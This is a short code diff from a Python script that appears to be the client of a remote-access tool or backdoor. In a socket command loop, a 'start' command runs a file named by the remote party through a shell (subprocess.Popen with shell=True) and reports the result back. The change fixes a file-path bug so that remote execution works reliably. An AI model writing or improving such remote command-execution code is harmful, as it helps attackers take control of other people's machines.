@@ -147,9 +147,9 @@ while True:
         elif message[:5].lower() == "start":
             filename = message[6:].strip()
             file_path = os.path.join(cwd, filename) 
-            if os.path.isfile(filename):
+            if os.path.isfile(file_path):
                 try:
-                    subprocess.Popen(filename, shell=True, cwd=cwd)
+                    subprocess.Popen(file_path, shell=True, cwd=cwd)
                     client.send("  [>] File has been executed.$$END$$".encode())
                 except Exception as e:
                     client.send(f"  [>] Failed to execute: {str(e)}$$END$$".encode())
